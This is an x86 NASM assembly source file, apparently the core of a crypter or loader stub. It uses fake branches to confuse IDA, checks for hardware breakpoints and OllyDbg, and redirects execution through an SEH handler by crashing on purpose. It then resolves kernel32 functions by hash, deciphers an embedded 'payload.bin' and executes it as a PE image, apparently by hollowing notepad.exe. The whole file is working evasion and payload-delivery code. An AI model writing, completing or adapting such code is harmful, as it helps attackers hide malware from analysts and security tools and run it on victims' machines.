align 16

%include "macro.asm"
%include "payload.inc"
%include "structure.asm"


section .data
OLLY	dd RANDOM32
PEBASE dd RANDOM32 ; Memory offset dest PE
PEB		 dd RANDOM32 ; PEB Location
CTX		 dd RANDOM32 ; 
PIS		 dd RANDOM32 ; Process information structure  
SIS		 dd RANDOM32 ; 
vRPEBASE	dd RANDOM32 ; Will old the PE  base value
PEENTRY dd RANDOM32; PE Entrypoint
PEIMAGEBASE dd RANDOM32 ; Will the PE base value  
PIMAGEBASE dd RANDOM32
PESECTION dw RANDOM16 ; Sections Count
PEZOFIMAGE dd RANDOM32
PEZOFHEADERS dd RANDOM32 
PEOPTHEADER dd RANDOM32
PEBASE2 dd 0 
SEH	dd _main + RANDOM16
RAMSTRU dd RANDOM32

;#FILE db 'C:\WINDOWS\SysWOW64\notepad.exe',0
FILE db 'C:\WINDOWS\notepad.exe',0

%include "hashs.inc"

section .text

%define OBS ; Compiling with or without obfuscation

GLOBAL _start

; ########## MAIN PROGRAM ##############
_start:
	push ebp
	mov	ebp,edi


	%ifdef OBS
	; Some work for IDA
	cmp	eax,RANDOM16+1	; n'arrive jamais
	jne .end1s
	call PAYLOAD + RANDOM8
.end1s
	cmp	eax,RANDOM32+1
	jne .ends
	call PAYLOAD + RANDOM8 +(EPELEN / 2)
	%endif


.ends
  xor  eax,eax  ; pas nécessaire sous Xp
	; Find egg SEH Handler
	not eax ; au démarrage du PE eax = 0
	sub dword [SEH],RANDOM16

	mov edi,esp   ; edi, stack
	mov ecx,eax
	repne scasd   ; Cherche 0xffffffff

	mov eax,[SEH]
.gocrash
	stosd  ; Replace SEH apres le 0xfffffffff
	mov	esi,edi		; Save ESI pour l'emplacement du SEH
	mov edi,ecx
	loop	.gocrash   ; call ecx ; Generate error, Jmp to vehand
	ret

PAYLOAD incbin  "payload.bin"

_end:
	invoke _ExitProcess@4, NULL
	
  db 0xa0 ; Obfuscate next instruction

_main:
		mov ebp,[esp+0xc] ; Context pointer location
		mov esi,ebp
		mov ecx,4*4        ; Addtionne les 4 registres DR0 - DR3
    add ebp,RANDOMs ; Context offset offuscation
.crcdr:								; anti debug de bks HDW  
	  lodsb
	  ;xadd  ah,al
  	loop  .crcdr        ; AX = 0 si pas de breakpoint hardware
  	mov	ebx,[ebp+eax+CTX__EBX-RANDOMs]		 ; recup EBX donc PIB 
		mov	[PEB],ebx
		mov esp,[ebp+eax+CTX__ESP-RANDOMs] ; recup esp
    
    mov ebx,[ebp+eax+CTX__EBP-RANDOMs] ; OLLY FFFFFFF ?
		or	ebx,1
		mov [OLLY],ebx

		mov ebx,[ebp+eax+CTX__ESI-RANDOMs] ; recup emplacement seh
		sub ebx,4
    mov	[SEH],ebx
		
		mov	ebp,esp

		; Reserve Memory for the PE image, used structure  and all the stuff...
		invokel _getdll,HASH_KERNEL32.DLL
		invokel _getfunction, eax, HASH_VIRTUALALLOC
		mov	ebx, RAMSTRU__LEN
		invokel eax, NULL, ebx, MEM_COMMIT, PAGE_READWRITE
		mov	[PEBASE], eax ; Save memory location

    ; Decipher the BBox 
    call _bbdxor
		; Decipher payload
		call _bbdecypher
		call _peexec
		jmp	_end


%include "bbcypher.asm"
%include "dllmgt.asm"
%include "peexec.asm"

